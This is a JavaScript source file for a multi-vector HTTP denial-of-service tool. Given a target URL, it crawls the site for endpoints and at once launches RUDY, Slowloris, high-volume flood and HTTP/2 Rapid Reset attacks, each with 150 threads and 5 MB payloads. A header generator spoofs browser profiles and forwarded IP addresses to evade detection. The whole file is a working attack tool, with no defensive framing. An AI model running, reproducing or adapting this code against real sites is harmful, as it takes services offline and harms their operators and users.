const http = require('http');
const https = require('https');
const http2 = require('http2');
const { URL } = require('url');
const got = require('got');

const userAgents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/109.0",
    "Mozilla/5.0 (X11; Linux i686; rv:109.0) Gecko/20100101 Firefox/109.0",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/109.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Safari/605.1.15",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.3 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPad; CPU OS 16_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.3 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36 Edg/109.0.1518.52",
    "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
    "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)",
    "curl/7.81.0",
];

const referers = [
    "https://www.google.com/", "https://www.youtube.com/", "https://www.facebook.com/", "https://www.twitter.com/",
    "https://www.instagram.com/", "https://www.baidu.com/", "https://www.wikipedia.org/", "https://yandex.ru/",
    "https://yahoo.com/", "https://www.amazon.com/", "https://www.reddit.com/", "https://duckduckgo.com/", "https://www.bing.com/", "https://www.tiktok.com/",
    "https://www.linkedin.com/", "https://www.pinterest.com/", "https://www.tumblr.com/",
];

const acceptHeaders = [
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
    "application/json, text/plain, */*", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "image/jpeg, application/x-ms-application, image/gif, application/xaml+xml, image/pjpeg, application/x-ms-xbap, */*",
    "application/xml,application/xhtml+xml,text/html;q=0.9, text/plain;q=0.8,image/png,*/*;q=0.5", "*/*",
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
    "application/json, text/javascript, */*; q=0.01",
];

function getRandomElement(arr) { return arr[Math.floor(Math.random() * arr.length)]; }
function generateRandomString(length) {
    const chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
    let result = '';
    for (let i = 0; i < length; i++) { result += chars.charAt(Math.floor(Math.random() * chars.length)); }
    return result;
}

class BypassGenerator {
    constructor() {
        this.browserProfiles = [
            {
                ua: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",
                ch: '"Not.A/Brand";v="8", "Chromium";v="114", "Google Chrome";v="114"',
                platform: '"Windows"'
            },
            {
                ua: "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",
                ch: '"Not.A/Brand";v="8", "Chromium";v="114", "Google Chrome";v="114"',
                platform: '"macOS"'
            },
            {
                ua: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36 Edg/113.0.1774.57",
                ch: '"Microsoft Edge";v="113", "Chromium";v="113", "Not-A.Brand";v="24"',
                platform: '"Windows"'
            },
            {
                ua: "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/114.0",
                ch: null, // Firefox doesn't send sec-ch-ua
                platform: '"Windows"'
            },
            {
                ua: "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36",
                ch: '"Chromium";v="112", "Google Chrome";v="112", "Not:A-Brand";v="99"',
                platform: '"Linux"'
            },
            {
                ua: "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Safari/605.1.15",
                ch: null, // Safari doesn't send sec-ch-ua
                platform: '"macOS"'
            },
            {
                ua: "Mozilla/5.0 (Linux; Android 13; SM-S908B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
                ch: '"Chromium";v="112", "Google Chrome";v="112", "Not:A-Brand";v="99"',
                platform: '"Android"'
            }
        ];
        this.acceptLanguages = ['en-US,en;q=0.9', 'en-GB,en;q=0.8', 'de-DE,de;q=0.9,en;q=0.8', 'es-ES,es;q=0.9,en;q=0.8', 'fr-FR,fr;q=0.9,en;q=0.8'];
        this.fetchDest = ['document', 'empty', 'script', 'style', 'image', 'font', 'object', 'media'];
        this.fetchMode = ['navigate', 'same-origin', 'no-cors', 'cors'];
        this.fetchSite = ['none', 'same-origin', 'cross-site'];
    }

    generateHeaders() {
        const profile = getRandomElement(this.browserProfiles);
        const randomIp = `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`;
        const referer = getRandomElement(referers);
        const origin = new URL(referer).origin;

        // Simulate different request contexts to bypass behavioral analysis
        const dest = getRandomElement(this.fetchDest);
        const mode = getRandomElement(this.fetchMode);
        // 'navigate' mode usually comes from 'none' or 'cross-site'
        const site = (mode === 'navigate') ? getRandomElement(['none', 'cross-site']) : getRandomElement(this.fetchSite);

        const headers = {
            'accept': getRandomElement(acceptHeaders),
            'accept-encoding': 'gzip, deflate, br',
            'accept-language': getRandomElement(this.acceptLanguages),
            'cache-control': getRandomElement(['no-cache', 'max-age=0', 'no-store', 'must-revalidate']),
            'pragma': 'no-cache',
            'referer': referer,
            'sec-fetch-dest': dest,
            'sec-fetch-mode': mode,
            'sec-fetch-site': site,
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': profile.ua,
            'te': 'trailers',
            'X-Forwarded-For': randomIp,
            'Via': `1.1 ${randomIp}`
        };

        // Randomly add headers to increase fingerprinting difficulty
        if (Math.random() > 0.4) {
            headers['origin'] = origin;
        }
        if (Math.random() > 0.5) {
            headers['dnt'] = '1'; // Do Not Track
        }
        if (Math.random() > 0.3) {
            headers['sec-gpc'] = '1'; // Global Privacy Control
        }

        if (profile.ch) {
            headers['sec-ch-ua'] = profile.ch;
            headers['sec-ch-ua-mobile'] = (profile.platform === '"Android"') ? '?1' : '?0';
            headers['sec-ch-ua-platform'] = profile.platform;
        }
        
        return headers;
    }

    generateComplexPayload() {
        const payloadType = getRandomElement(['json', 'form', 'nested-json', 'xml']);
        if (payloadType === 'json') {
            const jsonBody = {};
            for (let i = 0; i < 7; i++) {
                jsonBody[generateRandomString(8)] = generateRandomString(12);
            }
            return { contentType: 'application/json', body: JSON.stringify(jsonBody) };
        } else if (payloadType === 'form') {
            let formBody = '';
            for (let i = 0; i < 7; i++) {
                formBody += `${generateRandomString(8)}=${generateRandomString(12)}&`;
            }
            return { contentType: 'application/x-www-form-urlencoded', body: formBody.slice(0, -1) };
        } else if (payloadType === 'nested-json') {
            const jsonBody = {
                request_id: generateRandomString(16),
                user_data: {
                    id: Math.floor(Math.random() * 100000),
                    username: generateRandomString(10),
                    session_token: generateRandomString(32),
                    is_premium: Math.random() > 0.8
                },
                action: getRandomElement(['login', 'update_profile', 'get_data']),
                payload: {
                    [generateRandomString(6)]: generateRandomString(25),
                    [generateRandomString(8)]: { nested_key: generateRandomString(10) }
                },
                timestamp: Date.now()
            };
            return { contentType: 'application/json', body: JSON.stringify(jsonBody) };
        } else { // xml
            const key1 = generateRandomString(8);
            const val1 = generateRandomString(20);
            const key2 = generateRandomString(8);
            const val2 = generateRandomString(20);
            const xmlBody = `<?xml version="1.0"?><request><${key1}>${val1}</${key1}><${key2}>${val2}</${key2}></request>`;
            return { contentType: 'application/xml', body: xmlBody };
        }
    }
}

/**
 * "AI" Path Finder: A simple crawler to discover attackable endpoints.
 * It fetches the base URL, parses for internal links, and filters out static assets.
 */
class PathFinder {
    constructor(baseUrl) {
        try {
            this.baseUrl = new URL(baseUrl);
        } catch (e) {
            this.baseUrl = null;
        }
        // Start with the base URL itself as a guaranteed target
        this.discoveredPaths = new Set([baseUrl]);
    }

    async discover() {
        if (!this.baseUrl) {
            console.error("PathFinder: Invalid base URL provided.");
            return Array.from(this.discoveredPaths);
        }

        try { // Use a generic crawler User-Agent to fetch the page content
            const response = await got(this.baseUrl.href, {
                timeout: 5000,
                retry: { limit: 1 },
                headers: { 'User-Agent': 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)' }
            });

            const body = response.body; // --- HTML Parsing for <a> tags ---
            const linkRegex = /<a\s+(?:[^>]*?\s+)?href="([^"]*)"/gi;
            let match;

            while ((match = linkRegex.exec(body)) !== null) {
                const foundPath = match[1];
                try {
                    const absoluteUrl = new URL(foundPath, this.baseUrl.href); // 1. Keep only URLs from the same host
                    if (absoluteUrl.hostname !== this.baseUrl.hostname) continue;

                    // 2. Filter out links to common static files and anchors
                    const pathEnd = absoluteUrl.pathname.toLowerCase();
                    const staticFileExtensions = ['.css', '.js', '.png', '.jpg', '.jpeg', '.gif', '.svg', '.ico', '.webp', '.xml', '.pdf', '.zip', '.rar', '.txt'];
                    if (staticFileExtensions.some(ext => pathEnd.endsWith(ext))) continue;

                    // 3. Add the cleaned URL (without fragment) to our set
                    absoluteUrl.hash = ''; // Remove fragment identifiers like #section
                    this.discoveredPaths.add(absoluteUrl.href);

                } catch (e) { /* Ignore invalid URLs found in hrefs */ }
            }

            // --- JavaScript Parsing for API paths and routes ---
            const scriptSrcRegex = /<script[^>]+src="([^"]+)"/gi;
            const inlineScriptRegex = /<script[^>]*>([\s\S]*?)<\/script>/gi;
            const pathInJsRegex = /(['"`])(\/(?:[a-zA-Z0-9_.\-~/%]+)?)\1/g;

            const scriptProcessingPromises = [];

            // Find and process external scripts
            let scriptMatch;
            while ((scriptMatch = scriptSrcRegex.exec(body)) !== null) {
                scriptProcessingPromises.push(this.processScriptUrl(scriptMatch[1], pathInJsRegex));
            }

            // Find and process inline scripts
            let inlineScriptMatch;
            while ((inlineScriptMatch = inlineScriptRegex.exec(body)) !== null) {
                const scriptContent = inlineScriptMatch[1];
                if (scriptContent) {
                    this.findPathsInJsContent(scriptContent, pathInJsRegex);
                }
            }

            // Wait for all external scripts to be fetched and parsed
            await Promise.all(scriptProcessingPromises);

        } catch (error) {
            console.error(`PathFinder failed to crawl: ${error.message}. Using base URL only.`);
        }
        return Array.from(this.discoveredPaths);
    }

    async processScriptUrl(scriptPath, pathInJsRegex) {
        try {
            const absoluteUrl = new URL(scriptPath, this.baseUrl.href);
            if (absoluteUrl.hostname !== this.baseUrl.hostname) return;

            const response = await got(absoluteUrl.href, { timeout: 3000, retry: { limit: 1 } });
            this.findPathsInJsContent(response.body, pathInJsRegex);
        } catch (e) { /* Ignore errors from fetching/processing scripts */ }
    }

    findPathsInJsContent(content, pathInJsRegex) {
        let match;
        while ((match = pathInJsRegex.exec(content)) !== null) {
            const foundPath = match[2]; // The captured path group
            try {
                if (foundPath.length <= 1 && foundPath !== '/') continue; // Ignore empty or single-slash paths unless it's the root
                if (foundPath.includes(':') || foundPath.includes('{')) continue; // Simple filter for dynamic routes

                const absoluteUrl = new URL(foundPath, this.baseUrl.href);
                if (absoluteUrl.hostname !== this.baseUrl.hostname) continue;

                absoluteUrl.hash = '';
                this.discoveredPaths.add(absoluteUrl.href);
            } catch (e) { /* Ignore invalid paths */ }
        }
    }
}

class RudyAttack {
    constructor(targetUrl, threadCount, stats, bypasser, largePayload) {
        this.targetUrl = targetUrl;
        this.threadCount = threadCount;
        this.stats = stats;
        this.sockets = [];
        this.largePayload = largePayload;
        try {
            this.bypasser = bypasser;
            this.url = new URL(targetUrl);
            this.protocol = this.url.protocol === 'https:' ? https : http;
            this.agent = new (this.protocol === https ? https : http).Agent({ keepAlive: true, maxSockets: threadCount });
        } catch (e) { this.url = null; this.protocol = null; }
    }

    createConnection() {
        if (!this.url) return null;
        this.stats.total++;
        const headers = this.bypasser.generateHeaders();
        headers['Content-Type'] = 'application/x-www-form-urlencoded';
        headers['Content-Length'] = this.largePayload.length;
        headers['Connection'] = 'keep-alive';

        const options = {
            hostname: this.url.hostname,
            port: this.url.port || (this.url.protocol === 'https:' ? 443 : 80),
            path: this.url.pathname,
            method: 'POST',
            headers: headers,
            agent: this.agent,
        };

        let timeoutId;
        const req = this.protocol.request(options, (res) => {
            this.stats.success++;
            res.resume(); // Optimasi: Konsumsi response untuk membebaskan socket
            if (timeoutId) clearTimeout(timeoutId);
        });
        req.on('error', (err) => {
            this.stats.failed++;
            if (timeoutId) clearTimeout(timeoutId);
        });

        // Send initial small part of the body
        req.write(this.largePayload.slice(0, 10));

        let bytesSent = 10;
        const chunkSize = 16; // Send 16 bytes at a time

        const sendSlowChunk = () => {
            try {
                if (req.destroyed || bytesSent >= this.largePayload.length) { if (timeoutId) clearTimeout(timeoutId); return; }
                const chunk = this.largePayload.slice(bytesSent, bytesSent + chunkSize);
                req.write(chunk);
                bytesSent += chunkSize;
            } catch (e) { if (timeoutId) clearTimeout(timeoutId); }
        };

        const scheduleNextChunk = () => {
            const fixedInterval = 7000; // Delay tetap 7 detik
            timeoutId = setTimeout(() => {
                sendSlowChunk();
                scheduleNextChunk();
            }, fixedInterval);
        };
        scheduleNextChunk();
        return { req, timeoutId };
    }

    start() {
        for (let i = 0; i < this.threadCount; i++) {
            const socket = this.createConnection();
            if (socket) { this.sockets.push(socket); }
        }
    }

    stop() {
        this.sockets.forEach(({ req, timeoutId }) => {
            if (timeoutId) clearTimeout(timeoutId);
            if (req && !req.destroyed) req.destroy();
        });
        this.sockets = [];
    }
}

class SlowlorisAttack {
    constructor(targetUrl, threadCount, stats, bypasser, largePayload) {
        this.targetUrl = targetUrl;
        this.threadCount = threadCount;
        this.stats = stats;
        this.sockets = [];
        this.largePayload = largePayload;
        try {
            this.bypasser = bypasser;
            this.url = new URL(targetUrl);
            this.protocol = this.url.protocol === 'https:' ? https : http;
            this.agent = new (this.protocol === https ? https : http).Agent({ keepAlive: true, maxSockets: threadCount });
        } catch (e) { this.url = null; this.protocol = null; }
    }

    createConnection() {
        if (!this.url) return null;
        this.stats.total++;
        const headers = this.bypasser.generateHeaders();
        headers['Connection'] = 'keep-alive';
        headers['Content-Type'] = 'application/x-www-form-urlencoded';
        headers['Content-Length'] = this.largePayload.length;

        const options = {
            hostname: this.url.hostname,
            port: this.url.port || (this.url.protocol === 'https:' ? 443 : 80),
            path: this.url.pathname,
            method: 'POST',
            headers: headers,
            agent: this.agent,
        };

        let intervalId;
        const req = this.protocol.request(options);

        req.on('error', (err) => {
            this.stats.failed++;
            if (timeoutId) clearTimeout(timeoutId);
        });

        req.on('response', (res) => {
            this.stats.success++;
            res.resume();
        });

        // Send initial small part of the body
        req.write(this.largePayload.slice(0, 10));

        let bytesSent = 10;
        const chunkSize = 16; // Send 16 bytes at a time

        const sendSlowChunk = () => {
            try {
                if (req.destroyed || bytesSent >= this.largePayload.length) { if (timeoutId) clearTimeout(timeoutId); return; }
                const chunk = this.largePayload.slice(bytesSent, bytesSent + chunkSize);
                req.write(chunk);
                bytesSent += chunkSize;
            } catch (e) {
                this.stats.failed++;
                if (timeoutId) clearTimeout(timeoutId);
            }
        };

        const scheduleNextChunk = () => {
            timeoutId = setTimeout(() => {
                sendSlowChunk();
                scheduleNextChunk();
            }, 10000); // Delay tetap 10 detik
        };
        scheduleNextChunk();

        return { req, timeoutId };
    }

    start() {
        for (let i = 0; i < this.threadCount; i++) {
            const socket = this.createConnection();
            if (socket) { this.sockets.push(socket); }
        }
    }

    stop() {
        this.sockets.forEach(({ req, timeoutId }) => {
            if (timeoutId) clearTimeout(timeoutId);
            if (req && !req.destroyed) req.destroy();
        });
        this.sockets = [];
    }
}

class L7Flood {
    constructor(targetUrl, threadCount, delay, stats, bypasser, largePayload) {
        this.targetUrl = targetUrl;
        this.threadCount = threadCount;
        this.delay = delay;
        this.stats = stats;
        this._running = false;
        this.bypasser = bypasser;
        this.largePayload = largePayload;
        try {
            this.url = new URL(targetUrl);
            this.protocol = this.url.protocol === 'https:' ? https : http;
        } catch (e) { this.url = null; }
    }

    async sendRequest() {
        if (!this.url) return;
        this.stats.total++;
        const methods = ['GET', 'POST', 'HEAD', 'PUT', 'DELETE', 'OPTIONS'];
        const method = getRandomElement(methods);
        const cacheBust = `${generateRandomString(8)}=${generateRandomString(8)}&_=${Date.now()}`;
        const path = this.url.pathname + (this.url.search ? `${this.url.search}&${cacheBust}` : `?${cacheBust}`);
        const headers = this.bypasser.generateHeaders();
        
        const options = {
            method: method,
            headers: headers,
            http2: true,
            timeout: { request: 3000 }, // More aggressive timeout
            retry: { limit: 0 },
            throwHttpErrors: false,
        };

        if (['POST', 'PUT'].includes(method)) {
            // Mix of large brute-force payloads and small, complex evasion payloads
            if (Math.random() < 0.3) { // 30% chance for large payload
                options.body = this.largePayload;
                options.headers['Content-Type'] = 'application/octet-stream';
                options.headers['Content-Length'] = this.largePayload.length;
            } else { // 70% chance for small, complex payload
                const payload = this.bypasser.generateComplexPayload();
                options.body = payload.body;
                options.headers['Content-Type'] = payload.contentType;
                options.headers['Content-Length'] = Buffer.byteLength(payload.body);
            }
        }

        try {
            await got(this.url.origin + path, options);
            this.stats.success++;
        } catch (error) {
            this.stats.failed++;
        }
    }

    async runWorker() {
        while (this.running) {
            await this.sendRequest();
            if (this.delay > 0) {
                await new Promise(resolve => setTimeout(resolve, this.delay));
            }
        }
    }

    start() {
        this.running = true;
        for (let i = 0; i < this.threadCount; i++) {
            this.runWorker(); // Launch each worker, don't await
        }
    }

    stop() {
        this.running = false;
    }
}

class NuclearFlood extends L7Flood {
    async sendRequest() {
        if (!this.url) return;
        this.stats.total++;
        const method = getRandomElement(['POST', 'PUT']); // Only use heavy methods
        const cacheBust = `${generateRandomString(8)}=${generateRandomString(8)}&_=${Date.now()}`;
        const path = this.url.pathname + (this.url.search ? `${this.url.search}&${cacheBust}` : `?${cacheBust}`);
        const headers = this.bypasser.generateHeaders();

        const options = {
            method: method,
            headers: headers,
            http2: true,
            timeout: { request: 3000 }, // More aggressive timeout
            retry: { limit: 0 },
            throwHttpErrors: false,
        };

        // Mix of large brute-force payloads and small, complex evasion payloads
        if (Math.random() < 0.5) { // 50% chance for large payload in nuclear mode
            options.body = this.largePayload;
            options.headers['Content-Type'] = 'application/octet-stream';
            options.headers['Content-Length'] = this.largePayload.length;
        } else { // 50% chance for small, complex payload
            const payload = this.bypasser.generateComplexPayload();
            options.body = payload.body;
            options.headers['Content-Type'] = payload.contentType;
            options.headers['Content-Length'] = Buffer.byteLength(payload.body);
        }

        try {
            await got(this.url.origin + path, options);
            this.stats.success++;
        } catch (error) {
            this.stats.failed++;
        }
    }
}

class LogicBombAttack extends L7Flood {
    // This attack uses discovered paths from the "AI" PathFinder to systematically
    // hit multiple application endpoints with computationally expensive payloads.
    constructor(targetUrl, threadCount, delay, stats, bypasser, largePayload, discoveredPaths) {
        super(targetUrl, threadCount, delay, stats, bypasser, largePayload);
        // If discovery found paths, use them. Otherwise, fall back to the original URL.
        this.attackPaths = (discoveredPaths && discoveredPaths.length > 0) ? discoveredPaths : [targetUrl];
        console.log(`LogicBombAttack initialized with ${this.attackPaths.length} targets.`);
    }

    async sendRequest() {
        // For each request, pick a random target from the discovered paths.
        const randomTargetUrl = getRandomElement(this.attackPaths);
        let currentUrl;
        try {
            currentUrl = new URL(randomTargetUrl);
        } catch (e) {
            return; // Skip if a bad URL somehow got into the list
        }

        this.stats.total++;

        const method = 'POST';
        const path = currentUrl.pathname + currentUrl.search;
        const headers = this.bypasser.generateHeaders();

        const payload = this.bypasser.generateComplexPayload();
        headers['Content-Type'] = payload.contentType;
        headers['Content-Length'] = Buffer.byteLength(payload.body);

        const options = {
            method,
            headers,
            body: payload.body,
            http2: true,
            timeout: { request: 5000 }, // Longer timeout as we expect heavy processing
            retry: { limit: 0 },
            throwHttpErrors: false,
        };
        try {
            await got(currentUrl.origin + path, options);
            this.stats.success++;
        } catch (error) {
            this.stats.failed++;
        }
    }
}

class HTTP2RapidResetAttack {
    constructor(targetUrl, threadCount, stats, bypasser) {
        this.targetUrl = targetUrl;
        this.threadCount = threadCount;
        this.stats = stats;
        this.bypasser = bypasser;
        this._running = false;
        this.sessions = [];
        try {
            this.url = new URL(targetUrl);
            if (this.url.protocol !== 'https:') {
                console.error("HTTP/2 Rapid Reset requires an HTTPS target.");
                this.url = null; // Invalidate if not HTTPS
            }
        } catch (e) {
            this.url = null;
        }
    }

    start() {
        if (!this.url) return;
        this._running = true;
        for (let i = 0; i < this.threadCount; i++) {
            this.runWorker();
        }
    }

    stop() {
        this._running = false;
        this.sessions.forEach(session => {
            if (session && !session.destroyed) {
                session.destroy();
            }
        });
        this.sessions = [];
    }

    runWorker() {
        if (!this._running) return;

        const authority = this.url.origin;
        const clientSession = http2.connect(authority);
        this.sessions.push(clientSession);

        clientSession.on('error', (err) => { /* Errors are expected */ });

        clientSession.on('close', () => {
            const index = this.sessions.indexOf(clientSession);
            if (index > -1) this.sessions.splice(index, 1);
            if (this._running) this.runWorker(); // Reconnect
        });

        const sendResetBurst = () => {
            if (!this._running || clientSession.destroyed) return;
            try {
                for (let i = 0; i < 100; i++) { // Send a burst of 100 resets
                    const headers = { ...this.bypasser.generateHeaders(), ':method': 'GET', ':path': this.url.pathname, ':scheme': 'https', ':authority': this.url.hostname };
                    const stream = clientSession.request(headers);
                    stream.close(http2.constants.NGHTTP2_CANCEL); // Immediately cancel the stream
                    stream.on('error', (err) => { /* Ignore stream errors */ });
                    this.stats.total++;
                    this.stats.success++;
                }
            } catch (e) {
                this.stats.failed += 100;
            }
            setImmediate(sendResetBurst); // Schedule the next burst immediately
        };
        sendResetBurst();
    }
}

process.on('message', async ({ targetUrl, duration }) => {
    const threads = 150;
    const l7Delay = 900;

    const PAYLOAD_SIZE = 5 * 1024 * 1024; // 5 MB
    const largePayload = Buffer.alloc(PAYLOAD_SIZE, 'a');

    const bypasser = new BypassGenerator();

    // --- "AI" Path Discovery Phase ---
    const pathFinder = new PathFinder(targetUrl);
    const discoveredAttackPaths = await pathFinder.discover();

    const stats = { total: 0, success: 0, failed: 0, phase: 'Combined Attack' };

    // Kirim statistik ke proses induk setiap detik
    setInterval(() => {
        if (stats.total > 0 || stats.success > 0 || stats.failed > 0) {
            if (process.send) { // Pastikan proses induk masih ada
                process.send({ type: 'stats', data: { ...stats } });
            }
            // Reset penghitung setelah mengirim
            stats.total = 0;
            stats.success = 0;
            stats.failed = 0;
        }
    }, 1000);

    const totalDurationMs = duration * 1000;
    const attackers = [];

    // Instantiate all attackers
    attackers.push(new RudyAttack(targetUrl, threads, stats, bypasser, largePayload));
    attackers.push(new L7Flood(targetUrl, threads, l7Delay, stats, bypasser, largePayload));
    attackers.push(new SlowlorisAttack(targetUrl, threads, stats, bypasser, largePayload));
    attackers.push(new NuclearFlood(targetUrl, threads, l7Delay, stats, bypasser, largePayload));
    attackers.push(new LogicBombAttack(targetUrl, threads, l7Delay, stats, bypasser, null, discoveredAttackPaths));
    attackers.push(new HTTP2RapidResetAttack(targetUrl, threads, stats, bypasser));

    // Start all attackers
    attackers.forEach(attacker => {
        if (attacker && attacker.url) { // Check if URL was valid before starting
            attacker.start();
        }
    });

    // Set a single timeout to stop all attacks after the specified duration
    setTimeout(() => {
        attackers.forEach(attacker => {
            if (attacker) attacker.stop();
        });
    }, totalDurationMs);
});